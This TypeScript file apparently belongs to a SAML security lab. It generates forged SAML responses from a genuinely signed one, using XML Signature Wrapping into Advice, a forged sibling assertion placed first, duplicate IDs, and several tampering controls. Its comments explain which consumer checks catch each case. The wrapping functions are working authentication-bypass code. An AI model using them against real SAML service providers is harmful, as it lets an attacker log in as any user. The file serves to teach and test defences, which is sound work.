/**
 * The attacker's documents.
 *
 * Every one of these starts from a response the synthetic identity provider
 * really signed, and is produced by an attacker who holds no key: the only
 * powers used here are "see a valid response" and "edit XML", which is the weak
 * adversary model Somorovsky, Mayer, Schwenk, Kampmann and Jensen describe in
 * "On Breaking SAML: Be Whoever You Want to Be" (USENIX Security 2012).
 *
 * The wrapping case is the lesson. The others are controls that must fail for
 * DIFFERENT reasons at DIFFERENT layers, and keeping them apart is the point:
 * tampering with signature bytes breaks the cryptography and every consumer
 * catches it, while wrapping breaks nothing cryptographic at all.
 */
import {
  NS,
  allElements,
  childElements,
  parseXml,
  serializeXml,
  type XmlDocument,
  type XmlElement,
} from './dom.js';
import { iso, type ResponseSpec } from './build.js';
import { BEARER, NAMEID_EMAIL, NAMEID_ENTITY, AUTHN_PASSWORD_PROTECTED } from './profile.js';
import { elementsWithId } from './sign.js';

function el(doc: XmlDocument, local: string): XmlElement {
  return doc.createElementNS(NS.saml, `saml:${local}`) as XmlElement;
}

function text(doc: XmlDocument, value: string): unknown {
  return doc.createTextNode(value);
}

/**
 * A complete assertion that passes this lab's selected-assertion checks.
 *
 * Every audience, recipient, InResponseTo and time attribute is attacker-
 * controlled, so a consumer that runs those checks on the wrong element accepts
 * it. The hostile Response as a whole is not claimed to be conforming IdP output;
 * this assertion is built to isolate the consumer's element-binding defect.
 */
function forgedAssertion(doc: XmlDocument, spec: ResponseSpec, nameId: string, id: string): XmlElement {
  const assertion = el(doc, 'Assertion');
  assertion.setAttribute('ID', id);
  assertion.setAttribute('Version', '2.0');
  assertion.setAttribute('IssueInstant', iso(0));

  const issuer = el(doc, 'Issuer');
  issuer.setAttribute('Format', NAMEID_ENTITY);
  issuer.appendChild(text(doc, spec.issuer) as never);
  assertion.appendChild(issuer as never);

  const subject = el(doc, 'Subject');
  const name = el(doc, 'NameID');
  name.setAttribute('Format', NAMEID_EMAIL);
  name.appendChild(text(doc, nameId) as never);
  subject.appendChild(name as never);
  const confirmation = el(doc, 'SubjectConfirmation');
  confirmation.setAttribute('Method', BEARER);
  const data = el(doc, 'SubjectConfirmationData');
  data.setAttribute('NotOnOrAfter', iso(spec.confirmationNotOnOrAfterOffsetSeconds));
  data.setAttribute('Recipient', spec.recipient);
  if (spec.inResponseTo !== null) data.setAttribute('InResponseTo', spec.inResponseTo);
  confirmation.appendChild(data as never);
  subject.appendChild(confirmation as never);
  assertion.appendChild(subject as never);

  const conditions = el(doc, 'Conditions');
  conditions.setAttribute('NotBefore', iso(spec.notBeforeOffsetSeconds));
  conditions.setAttribute('NotOnOrAfter', iso(spec.notOnOrAfterOffsetSeconds));
  const restriction = el(doc, 'AudienceRestriction');
  const audience = el(doc, 'Audience');
  audience.appendChild(text(doc, spec.audience) as never);
  restriction.appendChild(audience as never);
  conditions.appendChild(restriction as never);
  assertion.appendChild(conditions as never);

  return assertion;
}

function authnStatement(doc: XmlDocument, spec: ResponseSpec): XmlElement {
  const statement = el(doc, 'AuthnStatement');
  statement.setAttribute('AuthnInstant', iso(-30));
  statement.setAttribute('SessionIndex', spec.sessionIndex);
  const context = el(doc, 'AuthnContext');
  const ref = el(doc, 'AuthnContextClassRef');
  ref.appendChild(text(doc, AUTHN_PASSWORD_PROTECTED) as never);
  context.appendChild(ref as never);
  statement.appendChild(context as never);
  return statement;
}

function signedAssertion(doc: XmlDocument, spec: ResponseSpec): XmlElement {
  const match = (elementsWithId(doc, spec.assertionId) as XmlElement[])[0];
  if (!match) throw new Error('the signed assertion is not in this document');
  return match;
}

/**
 * XML Signature Wrapping.
 *
 * The attacker's assertion becomes the response's assertion, and the original,
 * byte-for-byte unmodified, still-signed assertion is moved into the forged
 * assertion's `<saml:Advice>` element - a position the SAML assertion schema's
 * own sequence allows, after Subject and Conditions.
 *
 * Nothing cryptographic is touched. The one `<ds:Reference>` still reads
 * `#<original id>`, that ID still resolves to an element the identity provider
 * really signed, the enveloped-signature transform still removes exactly the
 * signature it should, and the digest still matches. A library still answers
 * true. What changed is which element comes first in document order, which is
 * the only thing a re-query can see.
 */
export function wrapInAdvice(signedXml: string, spec: ResponseSpec, forgedNameId: string): string {
  const doc = parseXml(signedXml);
  const response = doc.documentElement as unknown as XmlElement;
  const original = signedAssertion(doc, spec);

  const forged = forgedAssertion(doc, spec, forgedNameId, '_s12forged0000000000000000000001');
  const advice = el(doc, 'Advice');

  (response as unknown as { removeChild: (n: unknown) => void }).removeChild(original);
  advice.appendChild(original as never);
  forged.appendChild(advice as never);
  forged.appendChild(authnStatement(doc, spec) as never);
  response.appendChild(forged as never);

  return serializeXml(doc);
}

/**
 * The sibling variant: the attacker's assertion simply goes first.
 *
 * The original signed assertion stays exactly where it was, a direct child of
 * the response, and the attacker adds a second assertion ahead of it. This is
 * the permutation that shows why "check the position of the verified node" is
 * not on its own a repair: the verified node IS in the right position here, and
 * a consumer that then re-queries the document for its assertion still reads
 * the attacker's.
 *
 * Only binding the decision to the element verification returned catches it -
 * and that consumer does not merely refuse, it authorizes the right person.
 */
export function siblingAssertionFirst(
  signedXml: string,
  spec: ResponseSpec,
  forgedNameId: string,
): string {
  const doc = parseXml(signedXml);
  const response = doc.documentElement as unknown as XmlElement;
  const original = signedAssertion(doc, spec);
  const forged = forgedAssertion(doc, spec, forgedNameId, '_s12sibling000000000000000000001');
  forged.appendChild(authnStatement(doc, spec) as never);
  (response as unknown as { insertBefore: (a: unknown, b: unknown) => void }).insertBefore(
    forged,
    original,
  );
  return serializeXml(doc);
}

/**
 * Two elements carrying one ID.
 *
 * The forged copy is placed AFTER the original on purpose. A resolver that
 * takes the first match therefore still finds the signed element and still
 * answers true, and an application that takes the first `saml:Assertion` still
 * reads the honest subject - so on today's implementations this document looks
 * harmless. It is not: "the signed element" has no answer here, and which copy
 * any given resolver returns is an implementation detail rather than a
 * guarantee. A consumer that refuses it refuses on principle, before the
 * principle costs anything.
 */
export function duplicateAssertionId(
  signedXml: string,
  spec: ResponseSpec,
  forgedNameId: string,
): string {
  const doc = parseXml(signedXml);
  const response = doc.documentElement as unknown as XmlElement;
  const forged = forgedAssertion(doc, spec, forgedNameId, spec.assertionId);
  forged.appendChild(authnStatement(doc, spec) as never);
  response.appendChild(forged as never);
  return serializeXml(doc);
}

/** The reference points at an ID no element carries any more. */
export function removeReferencedId(signedXml: string, spec: ResponseSpec): string {
  const doc = parseXml(signedXml);
  const original = signedAssertion(doc, spec);
  original.removeAttribute('ID');
  return serializeXml(doc);
}

/** One byte of the base64 SignatureValue, changed. */
export function tamperSignatureBytes(signedXml: string): string {
  const doc = parseXml(signedXml);
  const signature = allElements(doc, NS.ds, 'Signature')[0];
  if (!signature) throw new Error('no ds:Signature to tamper with');
  const value = childElements(signature, NS.ds, 'SignatureValue')[0];
  if (!value) throw new Error('no ds:SignatureValue to tamper with');
  const original = (value.textContent ?? '').trim();
  const index = Math.floor(original.length / 2);
  const current = original[index] ?? 'A';
  const replacement = current === 'A' ? 'B' : 'A';
  value.textContent = `${original.slice(0, index)}${replacement}${original.slice(index + 1)}`;
  return serializeXml(doc);
}

/** The signed payload itself, edited: the digest, not the signature, must fail. */
export function tamperSignedSubject(signedXml: string, replacement: string): string {
  const doc = parseXml(signedXml);
  const name = allElements(doc, NS.saml, 'NameID')[0];
  if (!name) throw new Error('no saml:NameID to tamper with');
  name.textContent = replacement;
  return serializeXml(doc);
}

/** A third transform, outside the pair SAML Core 5.4.4 allows. */
export function addUnsupportedTransform(signedXml: string): string {
  const doc = parseXml(signedXml);
  const signature = allElements(doc, NS.ds, 'Signature')[0];
  if (!signature) throw new Error('no ds:Signature');
  const signedInfo = childElements(signature, NS.ds, 'SignedInfo')[0];
  const reference = signedInfo ? childElements(signedInfo, NS.ds, 'Reference')[0] : null;
  const transforms = reference ? childElements(reference, NS.ds, 'Transforms')[0] : null;
  if (!transforms) throw new Error('no ds:Transforms');
  const extra = doc.createElementNS(NS.ds, 'ds:Transform') as XmlElement;
  extra.setAttribute('Algorithm', 'http://www.w3.org/TR/1999/REC-xpath-19991116');
  transforms.appendChild(extra as never);
  return serializeXml(doc);
}
